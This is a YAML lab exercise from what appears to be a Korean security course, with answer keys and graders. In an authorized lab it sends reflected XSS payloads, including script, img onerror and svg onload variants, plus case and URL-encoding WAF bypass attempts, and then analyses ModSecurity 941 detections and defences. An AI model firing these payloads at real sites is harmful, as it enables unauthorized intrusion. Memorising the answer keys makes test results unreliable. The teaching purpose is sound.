lab_id: standalone-attack-week05
title: "XSS(Reflected·Stored·DOM·WAF 우회) vs XSS 탐지·차단 분석"
version: standalone-attack
course: attack
week: 5
description: |
  XSS 공방 — Reflected XSS와 payload 변형(img/svg/event), WAF 우회 시도와 CRS 941의 한계, 탐지·차단
  분석(dvwa 403 vs juice 200), 근본 방어(출력 인코딩+CSP). 공격은 el34-attacker. 인가된 실습만.
  명령은 el34 호스트에서.
difficulty: medium
duration_minutes: 170
prerequisites:
  - "W01–W04 통과"
  - "el34 호스트 SSH + docker exec"
  - "lecture §2(3유형) §3(변형) §4(우회) 숙지"
objectives:
  - "Reflected XSS + payload 변형"
  - "WAF 우회 시도 + CRS 941 한계"
  - "XSS 탐지·차단 분석 + 근본 방어(인코딩/CSP)"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 점검 — 대상
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
      ```
      ## ✅ 합격 기준
      대상 도달.
    hint: '대상 도달성'
    category: survey
    points: 10
    answer: |
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/"
    answer_detail: "XSS 대상 — dvwa(차단), juice(탐지만). 두 모드 비교용."
    verify:
      type: output_contains
      expect: 'dvwa'
      field: stdout
      semantic:
        intent: "대상 점검"
        success_criteria: ["대상 도달"]
        acceptable_methods: ["**[OSS] curl 도달성 (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 Reflected XSS — dvwa 차단
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'xss=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=<script>alert(1)</script>'"
      ```
      ## ✅ 합격 기준
      `<script>` XSS가 dvwa에서 403 차단된다.
    hint: '<script>alert(1)</script> → 403'
    category: manipulation
    points: 12
    answer: |
      echo "=== Reflected XSS (dvwa 차단) ==="
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'xss=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=<script>alert(1)</script>'"
      echo "→ <script> XSS가 941(XSS)+949110에 차단(403)"
    answer_detail: "Reflected XSS = 파라미터가 응답에 반사. <script>alert(1)</script>가 dvwa(차단)에서 941→403."
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "Reflected XSS + WAF 차단"
        success_criteria: ["<script> XSS", "403"]
        acceptable_methods: ["**[OSS] XSS → 403 (권장)**"]
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 XSS payload 변형
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'img=%{http_code} ' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=<img src=x onerror=alert(1)>'"
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'svg=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=<svg onload=alert(1)>'"
      ```
      ## ✅ 합격 기준
      이벤트 핸들러 XSS 변형이 탐지/차단된다.
    hint: '<img onerror>, <svg onload> 변형'
    category: manipulation
    points: 12
    answer: |
      echo "=== XSS 변형 (공백 %20 인코딩) ==="
      echo "[img onerror]"; docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'img=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=<img%20src=x%20onerror=alert(1)>'"
      echo "[svg onload]"; docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'svg=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=<svg%20onload=alert(1)>'"
      echo "→ 태그/이벤트 다양화(img/svg/onerror/onload)로 필터 우회 시도 — CRS 941은 이벤트 핸들러도 잡음"
    answer_detail: "XSS는 <script> 외에도 img onerror/svg onload/이벤트 핸들러로. CRS 941은 onerror=/onload= 등 이벤트 패턴도 탐지."
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "XSS payload 변형"
        success_criteria: ["img/svg 변형", "탐지/차단"]
        acceptable_methods: ["**[OSS] 이벤트 핸들러 XSS (권장)**"]
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 WAF 우회 시도
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'case=%{http_code} ' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=<ScRiPt>alert(1)</ScRiPt>'"
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'enc=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=%3Cscript%3Ealert(1)%3C/script%3E'"
      ```
      ## ✅ 합격 기준
      우회 시도 결과(CRS 정규화로 여전히 차단)를 확인한다.
    hint: '<ScRiPt> 대소문자, URL 인코딩 우회'
    category: manipulation
    points: 12
    answer: |
      echo "=== WAF 우회 시도 ==="
      echo "[대소문자]"; docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'case=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=<ScRiPt>alert(1)</ScRiPt>'"
      echo "[URL 인코딩]"; docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'enc=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=%3Cscript%3Ealert(1)%3C/script%3E'"
      echo "→ CRS는 정규화(대소문자 통일/URL 디코드) 후 검사 → 단순 우회는 여전히 403"
    answer_detail: "WAF 우회(대소문자/인코딩)는 ModSec 정규화에 무력 — 디코드/통일 후 941이 잡는다. 단순 우회는 여전히 차단."
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "WAF 우회 시도 + CRS 한계"
        success_criteria: ["우회 시도", "정규화로 차단"]
        acceptable_methods: ["**[OSS] 대소문자/인코딩 우회 (권장)**"]
    target_vm: web

  - order: 5
    instruction: |
      ## 🎯 탐지 분석 — ModSec 941
      ## 💻 실행 명령
      ```bash
      docker exec el34-web sh -c 'sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c'
      ```
      ## ✅ 합격 기준
      XSS가 ModSec 941에 탐지됨을 확인한다.
    hint: 'modsec 941 (XSS)'
    category: analysis
    points: 12
    answer: |
      echo "=== XSS 탐지 (ModSec 941) ==="
      docker exec el34-web sh -c 'sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c'
      echo "→ 941xxx(XSS 룰군)이 <script>/onerror/onload 패턴을 잡고, 949110에서 차단"
    answer_detail: "XSS 탐지 = ModSec 941 룰군(XSS 변형 다수). 941100(script)/941160(이벤트) 등 + 949110 anomaly."
    verify:
      type: output_contains
      expect: '941'
      field: stdout
      semantic:
        intent: "XSS ModSec 탐지"
        success_criteria: ["941 XSS 룰"]
        acceptable_methods: ["**[OSS] modsec 941 (권장)**"]
    target_vm: web

  - order: 6
    instruction: |
      ## 🎯 차단 vs 탐지 — dvwa vs juice
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code} ' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=<script>alert(1)</script>'"
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' 'http://10.20.30.1/?q=<script>alert(1)</script>'"
      ```
      ## ✅ 합격 기준
      같은 XSS가 dvwa(403) vs juice(200)로 다름을 확인한다.
    hint: '같은 XSS dvwa 403 vs juice 200'
    category: analysis
    points: 12
    answer: |
      echo "=== 같은 XSS, 다른 WAF 모드 ==="
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code} ' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=<script>alert(1)</script>'"
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' 'http://10.20.30.1/?q=<script>alert(1)</script>'"
      echo "→ dvwa=403(차단), juice=200(DetectionOnly). WAF 정책 차이"
    answer_detail: "WAF 모드 차이 — dvwa 403 차단, juice 200(탐지만). 같은 XSS, 다른 결과."
    verify:
      type: output_contains
      expect: 'juice=200'
      field: stdout
      semantic:
        intent: "차단 vs 탐지만"
        success_criteria: ["dvwa 403", "juice 200"]
        acceptable_methods: ["**[OSS] dvwa vs juice (권장)**"]
    target_vm: web

  - order: 7
    instruction: |
      ## 🎯 방어 — 출력 인코딩 + CSP
      ## 💻 실행 명령
      ```bash
      echo "근본: 출력 인코딩(context-aware) + CSP + HttpOnly 쿠키 + 입력 검증. WAF는 보조"
      ```
      ## ✅ 합격 기준
      XSS 근본 방어를 정리한다.
    hint: '출력 인코딩 + CSP'
    category: report
    points: 10
    answer: |
      echo "=== XSS 방어 ==="
      echo "① 출력 인코딩(context-aware): HTML/JS/URL 컨텍스트별 이스케이프 — 입력을 코드로 해석 안 함"
      echo "② CSP(Content-Security-Policy): 인라인 스크립트/외부 출처 제한"
      echo "③ HttpOnly 쿠키: JS의 세션 쿠키 접근 차단(탈취 방어)"
      echo "④ 입력 검증 + WAF(보조)"
      echo "→ 근본은 출력 인코딩. CSP가 2차 방어선"
    answer_detail: "XSS 근본 방어 = 출력 인코딩(컨텍스트별) + CSP + HttpOnly. WAF는 보조(우회 가능)."
    verify:
      type: output_contains
      expect: 'CSP'
      field: stdout
      semantic:
        intent: "XSS 방어 정리"
        success_criteria: ["출력 인코딩", "CSP"]
        acceptable_methods: ["**[설명] 근본 방어 (권장)**"]
    target_vm: web

  - order: 8
    instruction: |
      ## 🎯 XSS 공격 보고서
      ## 💻 보고서 양식
      ```markdown
      # 공격 W05 XSS 보고서 (학번, 이름)
      ## 1. 유형(Reflected/Stored/DOM) + payload
      ## 2. WAF 우회 시도 + CRS 941 한계
      ## 3. 탐지/차단(dvwa vs juice)
      ## 4. 방어(인코딩/CSP)
      ```
      ## ✅ 합격 기준
      보고서에 XSS 공방 + 방어가 포함된다.
    hint: '유형+우회+탐지+방어'
    category: report
    points: 10
    answer: |
      cat <<'EOF'
      # 공격 W05 XSS 보고서
      ## 1. 유형: Reflected(파라미터 반사)/Stored(저장,최위험)/DOM(클라). payload: script/img onerror/svg onload
      ## 2. 우회: 대소문자/인코딩 → CRS 정규화로 여전히 403
      ## 3. 탐지/차단: 941(XSS)→949110. dvwa 403 vs juice 200(DetectionOnly)
      ## 4. 방어: 출력 인코딩(근본)+CSP+HttpOnly. WAF 보조
      ## 결론: XSS는 피해자 브라우저에서 실행. CRS가 잘 막으나 근본은 출력 인코딩
      EOF
    answer_detail: "XSS 공방 = 유형/변형/우회 vs 941/모드/인코딩. 근본 방어는 출력 인코딩+CSP."
    verify:
      type: output_contains
      expect: 'XSS'
      field: stdout
      semantic:
        intent: "XSS 종합 보고"
        success_criteria: ["유형/우회/탐지/방어"]
        acceptable_methods: ["**[관리적] XSS 보고서 (권장)**"]
    target_vm: web
